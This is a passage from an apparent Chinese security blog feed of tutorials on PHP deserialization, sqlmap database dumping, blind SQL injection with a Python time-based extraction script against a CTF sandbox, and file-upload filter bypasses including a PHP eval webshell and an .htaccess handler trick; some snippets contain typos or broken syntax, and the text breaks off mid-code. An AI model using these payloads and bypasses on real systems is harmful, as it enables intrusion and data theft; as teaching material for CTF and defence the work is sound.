alt="在这里插入图片描述"><br>O代表Objec对象，6代表这个对象名字长度是6，People是对象名，2是对象中有2个变量，s是string，3是长度，age是变量名，i是int，18是值，后面的也是同理</p><p>而unserlize()中如果放的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">18</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>那么将会把这个序列对象化。这就是序列化的概念</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>谈到序列化不得不谈到几个常见的魔法方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">__destruct()：<span class="hljs-comment">//析构函数当对象被销毁时会被自动调用</span><br>__wakeup(): <span class="hljs-comment">//unserialize()时会被自动调用</span><br>__invoke(): <span class="hljs-comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span><br>__call(): <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span><br>__callStatci(): <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br>__get(): <span class="hljs-comment">//用于从不可访问的属性读取数据</span><br>__set(): <span class="hljs-comment">//用于将数据写入不可访问的属性</span><br>__isset(): <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span><br>__unset(): <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br>__toString(): <span class="hljs-comment">//把类当作字符串使用时触发</span><br>__construct(): <span class="hljs-comment">//创建一个对象时，调用_construct()</span><br>__sleep(): <span class="hljs-comment">//当序列化一个对象时会调用_sleep()函数</span><br></code></pre></td></tr></table></figure><p>当一个类中包含有这些方法时，在满足条件后这些方法会自动触发</p><p>例如以下的php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;BUZZ&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable2</span> = <span class="hljs-string">&#x27;OTHER&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printvariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;variable.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__wakeup&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__sleep&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;variable&#x27;</span>,<span class="hljs-string">&#x27;variable2&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//创建一个对象，回调用__construct</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-comment">//序列化一个对象，会调用__sleep</span><br><span class="hljs-variable">$serialized</span> = serialize(<span class="hljs-variable">$object</span>);<br><span class="hljs-comment">//输出序列化后的字符串</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Serialized:&#x27;</span>.<span class="hljs-variable">$serialized</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-comment">//重建对象，会调用__wakeup</span><br><span class="hljs-variable">$object2</span> = unserialize(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-comment">//调用printvariable,会输出数据(BUZZ)</span><br><span class="hljs-variable">$object2</span>-&gt;printvariable();<br><span class="hljs-comment">//脚本结束，会调用__destruct</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后的页面回显时这样<br><img src="https://img-blog.csdnimg.cn/b5e8827045b0485b8183fb8393453d2b.png" alt="在这里插入图片描述"><br>可以看到_construct()在对象创立时就自动触发了，序列化对象时触发了_sleep()，而在真是的代码中我并没有实际调用它，是它们自己满足条件后而触发的。<br>在最后也可以看到有两个_destruct被触发了，是因为有两个对象被在脚本结束被销毁了，所以执行了两次</p><p>另外php序列化中<br> protected属性被序列化的时候属性值会变成%00*%00属性名</p><p>private属性被序列化的时候属性值会变成%00类名%00属性名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$b</span>=<span class="hljs-number">13</span>;<br>&#125;<br><span class="hljs-variable">$A</span>=<span class="hljs-keyword">new</span> T();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$A</span>)<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终序列化样子是<br><img src="https://img-blog.csdnimg.cn/c49515c64c214c9cb0220a7b428061d9.png" alt="在这里插入图片描述"><br>对于这种情况我们需要反序列化的样子为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;%00A%00a&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;%00*%00b&quot;</span>;i:<span class="hljs-number">13</span>;&#125;<br></code></pre></td></tr></table></figure><p>当发现一个反序列化漏洞时，我们通常会自己构建一个反序列化的payload，然后执行它并绕过关键魔法方法达到注入效果，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">int</span> a=<span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    &#125;<br><span class="hljs-variable">$A</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]<br><span class="hljs-variable">$B</span>=unserialize(<span class="hljs-variable">$A</span>)<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//1.php</span><br></code></pre></td></tr></table></figure><p>如果我们构造这样一个payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">8</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> A();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//2.php</span><br></code></pre></td></tr></table></figure><p>把序列化后结果输入在url上<br>当1.php中的对象B创造时，里面的_construct就自动触发了，打开了phpinfo()，这是一个最简单的反序列化漏洞的例子</p><h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><p>php中Session获取资源也是先序列化再储存，当读取时再进行反序列化操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;spoock&#x27;</span>;<br>var_dump(<span class="hljs-variable">$_SESSION</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一段php代码，再php_serialize引擎下，session序列化的数据为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;spoock&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>php引擎下为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;spoock&quot;</span>;<br></code></pre></td></tr></table></figure><p>php_binary引擎下为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">names:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;spoock&quot;</span>;<br></code></pre></td></tr></table></figure><p>php正常下session的实现是没有问题的，危害主要是程序员的Session使用不当引起的</p><p>当网站序列化存储session与反序列化读取session使用的引擎不同时，会导致数据无法正确的反序列化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP漏洞</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap用法</title>
    <link href="/2021/08/15/sqlmap%E7%94%A8%E6%B3%95/"/>
    <url>/2021/08/15/sqlmap%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>一些简单的sqlmap命令</p><span id="more"></span><h2 id="get注入基本用法"><a href="#get注入基本用法" class="headerlink" title="get注入基本用法"></a>get注入基本用法</h2><p>相关代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py &quot;url&quot; --dbs<br>python sqlmap.py -D &quot;数据库&quot; --tables<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; --columns<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; -C &quot;列&quot; --dump<br></code></pre></td></tr></table></figure><h2 id="post注入基本用法"><a href="#post注入基本用法" class="headerlink" title="post注入基本用法"></a>post注入基本用法</h2><p>1、先对页面进行抓包</p><p>2、找到相对应的注入点前后加上*</p><p>3、保存为txt文档到桌面</p><p>4、对txt文档进行sql注入</p><p>相关代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">pyhon sqlmap.py -r 文本文件 --dbs          //查看所有数据库,若执行不出，可在后面加--level=3代表注入等级<br>pyhon sqlmap.py -r 文本文件 --current-db    //查看当前数据库<br></code></pre></td></tr></table></figure><hr><p>title: test2<br>date: 2019-10-26 17:14:26<br>tags:<br>    - 小工具<br>    - hexo<br>    - yilia<br>    - tag</p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql盲注</title>
    <link href="/2021/08/08/sql%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/08/08/sql%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<p>在sql注入中，有一种类型就是盲注，当我们sql注入后，页面没有返回给我们有用的回显时，这时候就需要用到盲注了<br>盲注分为两种类型，一种时布尔盲注，还有一种是时间盲注，时间盲注是建立再布尔盲注的基础上。</p><span id="more"></span><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注的使用情况，只有当我们能够判断自己输入的sql语句是否正确时才能使用布尔盲注，</p><p>例如当我们输入一条错误的语句，页面返回错误，输入正确的语句时，页面正常显示<br>下面时布尔盲注中，常用的几个函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">length()<span class="hljs-operator">/</span><span class="hljs-operator">/</span>测试长度<br>substr()<span class="hljs-operator">/</span><span class="hljs-operator">/</span>截取字符<br>ascii()<span class="hljs-operator">/</span><span class="hljs-operator">/</span>转换字符的ascii码<br></code></pre></td></tr></table></figure><p>具体使用方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,length(database())<span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,ascll(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">100</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断该当前数据库的第一个字符的ascii码是否时<span class="hljs-number">100</span>，从而确定字符<br></code></pre></td></tr></table></figure><p>我们先判断数据库的长度，再一个一个判断是哪一个字符，通过该方法，我们可以把数据库地全部字符给推出来，甚至可以将数据库中其他信息都给推出，具体方法和整型注入相似<a href="https://blog.csdn.net/qq_51553814/article/details/118639300">sql注入实例</a></p><p>由于手动输入的话通常太慢，通常情况下是配合python脚本来完成</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在布尔盲注的基础之上还有一种类型就是时间盲注</p><p>时间盲注主要是运用了sleep()函数,sleep()函数可以让我们的页面返回产生延迟，如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">slecet <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>当我们的数据库中的第一个字符是s的时候，页面则延迟一秒返回，否则返回1，需要注意的是，这个返回的1必须是正确返回值，这样，这个if语句无论结果怎样，都能正确地注入</p><p>和布尔盲注不同，有了sleep函数，我们只需要判断页面返回的时间，并不需要页面是否有正确地返回，所以时间盲注通常适用于布尔盲注使用不了的情况，也就是判断不了自己输入的代码是否正确。</p><p>以下是时间盲注python的参考代码，我是以查询database()为例，具体盲注时改变payload即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>session=requests.session()<br>url = <span class="hljs-string">&quot;http://challenge-95e4b72785c4d45c.sandbox.ctfhub.com:10800/?id=&quot;</span><br>name = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">128</span>):<br>j = (<span class="hljs-number">128</span>+<span class="hljs-number">31</span>) -j<br>str_ascii=<span class="hljs-built_in">chr</span>(j)<br><span class="hljs-comment">#数据库名</span><br>payolad = <span class="hljs-string">&quot;if(substr(database(),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot;</span>%(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(str_ascii))<br>start_time=time.time()<br>str_get = session.get(url=url + payolad)<br>end_time = time.time()<br>t = end_time - start_time<br><span class="hljs-keyword">if</span> t &gt; <span class="hljs-number">1</span>:<br><span class="hljs-keyword">if</span> str_ascii == <span class="hljs-string">&quot;+&quot;</span>:<br>sys.exit()<br><span class="hljs-keyword">else</span>:<br>name+=str_ascii<br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure><p>布尔盲注的具体python代码与时间盲注类似</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传原理及常见的绕过方式</title>
    <link href="/2021/07/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2021/07/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传恶意文件，从而获取信息造成危害</p><span id="more"></span><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>假设有一个服务器，它希望你能够上传照片，但是你却上传了一个木马文件，并且上传成功了。那么这个木马文件就会再服务器的后台，是可以被执行的，这就是文件上传漏洞</p><p>本文主要是讲述一些典型的绕过手段</p><pre><code>最典型的木马文件如下</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;php? <span class="hljs-keyword">eval</span>(_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当该文件被上传到服务器后端时，我们就可以通过一些方式来获取我们想要的信息了</p><p>通过中国蚁剑连接到对应的文件上传目录，我们就可以连接到对应的url了，从而获取url里其他目录的文件<br><img src="https://img-blog.csdnimg.cn/2021071319301285.png#pic_center" alt="在这里插入图片描述">蚁剑的使用方法简单不加以说明</p><p>当然，当我们进行文件上传时，客户端或者是服务端不会让我们直接上传.php木马文件，会对前端或是后端加以限制，目的在于让我们无法完成木马文件上传操作，或者是找不到上传目录</p><p>所以就需要们掌握文件上传的各种让过，而文件上传有一下几种验证方式<br><img src="https://img-blog.csdnimg.cn/20210713194733897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h2><ul><li><p>为了防止我们恶意上传木马文件，客户端的前端或是后端往往会对上传文件类型有限制，前端验证就是其中一种</p></li><li><p>前端验证往往是通过客户端的javascript来对上传文件加以限制，当我们打开Burpsuit抓包，我们将php文件上传，Burp未抓到，页面就弹出文件格式错误的警告，这种往往就是前端验证，由于代码写在前端页面，导致我们还未抓到包就报错<br><img src="https://img-blog.csdnimg.cn/20210713200131367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p></li><li><p>解决方法也很简单，我们用把.php文件改为可以被允许的.jpg文件，然后上传，把抓的包拦截，再Burpsuit里面将1.jpg文件改为1.php文件，就可以绕过前端验证，上传php文件。<br><img src="https://img-blog.csdnimg.cn/20210713200309201.png" alt="在这里插入图片描述"></p></li></ul><h2 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h2><ul><li><p>MIME类型检测是指，当我们上传一个文件时，我们发送的包中有一项Content Type，后面放的是我们发送文件的种类<br><img src="https://img-blog.csdnimg.cn/20210713195317554.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>服务端往往会对这一种类进行检测，通常会只允许我们上传规定的文件类型，如image/jpeg是jpg类型，image/png是png的类型，若是遇到php文件的类型(application/octet-stream)则会上传失败，服务端拒绝接收包。</p></li></ul><p>绕过方法很简单，我们只需要使用Burpsuit抓包，再Content-Type后面改为服务端允许的文件类型，就可以躲避服务端的MIME检测<br> <img src="https://img-blog.csdnimg.cn/20210713195626490.png#pic_center" alt="在这里插入图片描述"></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><ul><li><p>原理：</p><p>  和C语言相同，C语言的数组中\0代表结束符，计算机当编译到\0时则认为数组结束，<strong>00截断</strong>也是相同的原理，在遇到某些函数时，函数会将%00看作为结束符号。那么运行到%00前面就中断了</p></li></ul><p>当我们的文件路径如下时</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php/upload/<span class="hljs-number">1</span>.php%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><p>然后实际客户端读取的是/index.php/upload/1.php</p><p>同样，有些服务端不仅对Content-Type有类型限制，也限制了.php等文件格式，在上传1.php时，我们也可以用Burpsuit对1.php进行如下修改</p><p><img src="https://img-blog.csdnimg.cn/20210713202701839.png#pic_center" alt="在这里插入图片描述"><br>这样，服务端就会认为我们上传的时.jpg文件，而实际上我们上传的是1.php</p><h2 id="文件名后缀绕过"><a href="#文件名后缀绕过" class="headerlink" title="文件名后缀绕过"></a>文件名后缀绕过</h2><ul><li>原理<br> 部分情况服务端可能会对报文部分类型的后缀文件禁止上传，如遇到**.php,.php4,.php5**等等文件就发生报错，当00截断的条件也不满足时，我们就需要采取特殊的绕过了</li></ul><ol><li>更换同类的后缀名<br>当php后缀被禁用时，可以试试将后缀名改为<strong>php4</strong>和<strong>php5</strong>，其他类型的木马文件同样如此，可以换成同类型的木马文件后缀，来绕过后缀名的检测当我们不知道有哪些后缀名可以使用时，我们可以通过<strong>爆破</strong>的方式，把所有木马文件后缀放在一个txt文档中进行爆破</li></ol><ol start="2"><li><p>有些Apache是允许解析其他文件后缀的，例如在**.htaccess**中， 如果配置有如下代码，则能够解析php和phtm|文件。</p><p>再上传一个.jpg文件，会自动当php文件识别</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apach">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><ol start="3"><li><p>在windos中，文件默认读取顺序时从右到左，遇到 . 停止，当遇到一个无法识别的文件后缀时，自动选择跳过，从而造成了漏洞的出现</p><p>如1.php.abcd 在读取的时候就默认读取为1.php</p></li><li><p>特定函数绕过<br>有些服务端为了删除.php文件，使用了特定的函数，例如该源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-variable">$name</span> = basename(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = str_ireplace(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span 